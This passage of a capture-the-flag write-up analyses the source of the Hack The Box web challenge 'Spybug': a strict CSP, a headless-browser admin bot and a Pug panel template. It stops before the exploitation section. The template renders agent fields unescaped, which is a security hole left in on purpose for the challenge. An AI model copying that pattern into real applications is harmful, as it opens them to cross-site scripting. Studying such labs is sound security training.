<!doctype html><html lang="en"><head><title>Spybug | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Malicious file upload. SSTI to XSS. CSP bypass"><meta name="image" content="https://7rocky.github.io/images/web.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Malicious file upload. SSTI to XSS. CSP bypass"><meta itemprop="keywords" content><meta itemprop="name" content="Spybug"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Malicious file upload. SSTI to XSS. CSP bypass"><meta property="og:image" content="https://7rocky.github.io/images/web.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Spybug"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/web/spybug/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Malicious file upload. SSTI to XSS. CSP bypass"><meta name="twitter:description" content="Malicious file upload. SSTI to XSS. CSP bypass"><meta name="twitter:image" content="https://7rocky.github.io/images/web.png"><meta name="twitter:title" content="Spybug"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/web/spybug/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/web/spybug/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- WEB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/web/spybug/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/web/spybug/&amp;text=Spybug" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/web/spybug/&amp;title=Spybug" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Spybug</h1><p class="mb4 f6 dib tracked">8 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#file-upload-functionality">File upload functionality</a></li><li><a href="#agent-analysis">Agent analysis</a></li></ul></li><li><a href="#exploitation">Exploitation</a><ul><li><a href="#performing-the-attack">Performing the attack</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a website like this:</p><p><img alt="SpyBug 1" src="/images/HTB-Challenges/HTB-Web-Spybug-1.webp"></p><p>We also have the source code of the web application in Node.js and the source code of an agent in Go.</p><h2 id="source-code-analysis">Source code analysis</h2><p>The web application is built with Express JS. In <code>index.js</code> we can see a Content Security Policy (CSP) header and a function <code>visitPanel</code> that runs every minute:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">((</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">, </span><span class="mtk8">next</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">setHeader</span><span class="mtk1">(</span><span class="mtk4">"Content-Security-Policy"</span><span class="mtk1">, </span><span class="mtk4">"script-src 'self'; frame-ancestors 'none'; object</span><span class="mtk4">-src 'none'; base-uri 'none';"</span><span class="mtk1">);</span>  
<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">setHeader</span><span class="mtk1">(</span><span class="mtk4">"Cache-Control"</span><span class="mtk1">, </span><span class="mtk4">"no-cache, no-store, must-revalidate"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">setHeader</span><span class="mtk1">(</span><span class="mtk4">"Pragma"</span><span class="mtk1">, </span><span class="mtk4">"no-cache"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">setHeader</span><span class="mtk1">(</span><span class="mtk4">"Expires"</span><span class="mtk1">, </span><span class="mtk4">"0"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">next</span><span class="mtk1">();</span>
<span class="mtk1">});</span>

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">set</span><span class="mtk1">(</span><span class="mtk4">"view engine"</span><span class="mtk1">, </span><span class="mtk4">"pug"</span><span class="mtk1">);</span>

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk1">genericRoutes</span><span class="mtk1">);</span>
<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk1">panelRoutes</span><span class="mtk1">);</span>
<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk1">agentRoutes</span><span class="mtk1">);</span>

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">listen</span><span class="mtk1">(</span><span class="mtk6">1337</span>, </span><span class="mtk4">"0.0.0.0"</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {
<span class="mtk1">  </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">`Listening on port 1337`</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk8">createAdmin</span><span class="mtk1">();</span>
<span class="mtk7">setInterval</span><span class="mtk1">(visitPanel, </span><span class="mtk6">60000</span><span class="mtk1">);</span>
</code></pre></div><p>The CSP is very strict, we can see some comments on it in a <a target="_blank" href="https://csp-evaluator.withgoogle.com">CSP evaluator</a>:</p><p><img alt="SpyBug 2" src="/images/other/HTB%20Cyber%20Apocalypse%202023/SpyBug-2.webp"></p><p>The <code>script-src 'self'</code> field is the one that looks promising if we can upload files to the server.</p><p>This is the <code>visitPanel</code> function (in <code>utils/adminbot.js</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"dotenv"</span><span class="mtk1">).</span><span class="mtk8">config</span><span class="mtk1">();</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> puppeteer </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"puppeteer"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">browserOptions</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk1">headless</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">,</span>
<span class="mtk1">  </span><span class="mtk1">executablePath</span><span class="mtk1">: </span><span class="mtk4">"/usr/bin/chromium-browser"</span><span class="mtk1">,</span>
<span class="mtk1">  </span><span class="mtk1">args</span><span class="mtk1">: [</span>
<span class="mtk1">    </span><span class="mtk4">"--no-sandbox"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--disable-background-networking"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--disable-default-apps"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--disable-extensions"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--disable-gpu"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--disable-sync"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--disable-translate"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--hide-scrollbars"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--metrics-recording-only"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--mute-audio"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--no-first-run"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--safebrowsing-disable-auto-update"</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk4">"--js-flags=--noexpose_wasm,--jitless"</span><span class="mtk1">,</span>
<span class="mtk1">  ],</span>
<span class="mtk1">};</span>

<span class="mtk7 mtki">exports</span><span class="mtk1">.</span><span class="mtk8">visitPanel</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">browser</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> puppeteer.</span><span class="mtk8">launch</span><span class="mtk1">(</span><span class="mtk1">browserOptions</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">browser</span><span class="mtk1">.</span><span class="mtk8">createIncognitoBrowserContext</span><span class="mtk1">();</span>  
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">newPage</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">goto</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk4 detected-link">http://0.0.0.0:1337/</span><span class="mtk4">"</span><span class="mtk1">, {</span>
<span class="mtk1">      </span><span class="mtk1">waitUntil</span><span class="mtk1">: </span><span class="mtk4">"networkidle2"</span><span class="mtk1">,</span>
<span class="mtk1">      </span><span class="mtk1">timeout</span><span class="mtk1">: </span><span class="mtk6">5000</span><span class="mtk1">,</span>
<span class="mtk1">    });</span>

<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">type</span><span class="mtk1">(</span><span class="mtk4">"#username"</span><span class="mtk1">, </span><span class="mtk4">"admin"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">type</span><span class="mtk1">(</span><span class="mtk4">"#password"</span><span class="mtk1">, process.env.ADMIN_SECRET);</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">click</span><span class="mtk1">(</span><span class="mtk4">"#loginButton"</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">waitForTimeout</span><span class="mtk1">(</span><span class="mtk6">5000</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">browser</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">();</span>
<span class="mtk1">  } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">};</span>
</code></pre></div><p>It runs a headless Chromium browser to visit his own panel (after entering credentials). Having a CSP and a bot that accesses a page using a browser means that the challenge must involve a client-side attack like Cross-Site Scripting (XSS).</p><p>Plus, looking at the routes for <code>routes/panel.js</code>, we see that <code>admin</code> will have the flag printed on screen:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"/panel"</span><span class="mtk1">, authUser, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>  
<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"panel"</span><span class="mtk1">, {</span>
<span class="mtk1">    </span><span class="mtk1">username</span><span class="mtk1">:</span>
<span class="mtk1">      </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.username </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">"admin"</span>
<span class="mtk1">        </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk4">'HTB{f4k3_fl4g_f0r_t3st1ng}'</span>
<span class="mtk1">        </span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.session.username,</span>
<span class="mtk1">    </span><span class="mtk1">agents</span><span class="mtk1">: </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">getAgents</span><span class="mtk1">(),</span>
<span class="mtk1">    </span><span class="mtk1">recordings</span><span class="mtk1">: </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">getRecordings</span><span class="mtk1">(),</span>
<span class="mtk1">  });</span>
<span class="mtk1">});</span>
</code></pre></div><p>The server uses <code>pug</code> as template renderer. This is <code>views/panel.pug</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">doctype html</span>
<span class="mtk5">head</span>
<span class="mtk1">  </span><span class="mtk5">title</span><span class="mtk1"> Spybug | Panel</span>
<span class="mtk1">  </span><span class="mtk7 mtki">include</span><span class="mtk1"> head.pug</span>
<span class="mtk5">body</span>
<span class="mtk1">  </span><span class="mtk5">div</span><span class="mtk8">.container.login.mt-5.mb-5</span>
<span class="mtk1">    </span><span class="mtk5">div</span><span class="mtk8">.row</span>
<span class="mtk1">      </span><span class="mtk5">div</span><span class="mtk8">.col-md-10</span>
<span class="mtk1">        </span><span class="mtk5">h1</span>
<span class="mtk1">          </span><span class="mtk5">i</span><span class="mtk8">.las.la-satellite-dish</span>
<span class="mtk1">          | </span><span class="mtk6">&amp;nbsp;</span><span class="mtk1">Spybug v1</span>
<span class="mtk1">      </span><span class="mtk5">div</span><span class="mtk8">.col-md-2.float-right</span>
<span class="mtk1">        </span><span class="mtk5">a</span><span class="mtk8">.btn.login-btn.mt-3</span><span class="mtk1">(</span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"/panel/logout"</span><span class="mtk1">) Log-out</span>  
<span class="mtk1">    </span><span class="mtk5">hr</span><span class="mtk1"> </span>
<span class="mtk1">    </span><span class="mtk5">h2</span><span class="mtk1"> </span><span class="mtk4">#{"Welcome back " </span><span class="mtk5">+</span><span class="mtk4"> </span><span class="mtk1">username</span><span class="mtk4">}</span>
<span class="mtk1">    </span><span class="mtk5">hr</span>
<span class="mtk1">    </span><span class="mtk5">h3</span>
<span class="mtk1">      </span><span class="mtk5">i</span><span class="mtk8">.las.la-laptop</span>
<span class="mtk1">      | </span><span class="mtk6">&amp;nbsp;</span><span class="mtk1">Agents</span>
<span class="mtk1">    </span><span class="mtk7 mtki">if</span><span class="mtk1"> agents.length </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span>
<span class="mtk1">      </span><span class="mtk5">table</span><span class="mtk8">.w-100</span>
<span class="mtk1">        </span><span class="mtk5">thead</span>
<span class="mtk1">          </span><span class="mtk5">tr</span>
<span class="mtk1">          </span><span class="mtk5">th</span><span class="mtk1"> ID</span>
<span class="mtk1">          </span><span class="mtk5">th</span><span class="mtk1"> Hostname</span>
<span class="mtk1">          </span><span class="mtk5">th</span><span class="mtk1"> Platform</span>
<span class="mtk1">          </span><span class="mtk5">th</span><span class="mtk1"> Arch</span>
<span class="mtk1">        </span><span class="mtk5">tbody</span>
<span class="mtk1">          </span><span class="mtk7 mtki">each</span><span class="mtk1"> agent </span><span class="mtk5">in</span><span class="mtk1"> agents</span>
<span class="mtk1">            </span><span class="mtk5">tr</span>
<span class="mtk1">              </span><span class="mtk5">td</span><span class="mtk1">= agent.identifier</span>
<span class="mtk1">              </span><span class="mtk5">td</span><span class="mtk1"> </span><span class="mtk4">!{</span><span class="mtk1">agent</span><span class="mtk4">.</span><span class="mtk1">hostname</span><span class="mtk4">}</span>
<span class="mtk1">              </span><span class="mtk5">td</span><span class="mtk1"> </span><span class="mtk4">!{</span><span class="mtk1">agent</span><span class="mtk4">.</span><span class="mtk1">platform</span><span class="mtk4">}</span>
<span class="mtk1">              </span><span class="mtk5">td</span><span class="mtk1"> </span><span class="mtk4">!{</span><span class="mtk1">agent</span><span class="mtk4">.</span><span class="mtk1">arch</span><span class="mtk4">}</span>
<span class="mtk1">    </span><span class="mtk7 mtki">else</span>
<span class="mtk1">      </span><span class="mtk5">h2</span><span class="mtk1"> No agents</span>

<span class="mtk1">    </span><span class="mtk5">hr</span>
<span class="mtk1">    </span><span class="mtk5">h3</span>
<span class="mtk1">      </span><span class="mtk5">i</span><span class="mtk8">.las.la-play-circle</span>
<span class="mtk1">      | </span><span class="mtk6">&amp;nbsp;</span><span class="mtk1">Recordings</span>
<span class="mtk1">    </span><span class="mtk7 mtki">if</span><span class="mtk1"> recordings.length </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span>
<span class="mtk1">      </span><span class="mtk5">table</span><span class="mtk8">.w-100</span>
<span class="mtk1">        </span><span class="mtk5">thead</span>
<span class="mtk1">          </span><span class="mtk5">tr</span>
<span class="mtk1">          </span><span class="mtk5">th</span><span class="mtk1"> Agent ID</span>
<span class="mtk1">          </span><span class="mtk5">th</span><span class="mtk1"> Audio</span>
<span class="mtk1">        </span><span class="mtk5">tbody</span>
<span class="mtk1">          </span><span class="mtk7 mtki">each</span><span class="mtk1"> recording </span><span class="mtk5">in</span><span class="mtk1"> recordings</span>
<span class="mtk1">            </span><span class="mtk5">tr</span>
<span class="mtk1">              </span><span class="mtk5">td</span><span class="mtk1">= recording.agentId</span>
<span class="mtk1">              </span><span class="mtk5">td</span>
<span class="mtk1">                </span><span class="mtk5">audio</span><span class="mtk1">(</span><span class="mtk8">controls</span><span class="mtk1">=</span><span class="mtk4">''</span><span class="mtk1">)</span>
<span class="mtk1">                  </span><span class="mtk5">source</span><span class="mtk1">(</span><span class="mtk8">src</span><span class="mtk1">=recording.filepath)</span>
<span class="mtk1">    </span><span class="mtk7 mtki">else</span>
<span class="mtk1">      </span><span class="mtk5">h2</span><span class="mtk1"> No recordings</span>
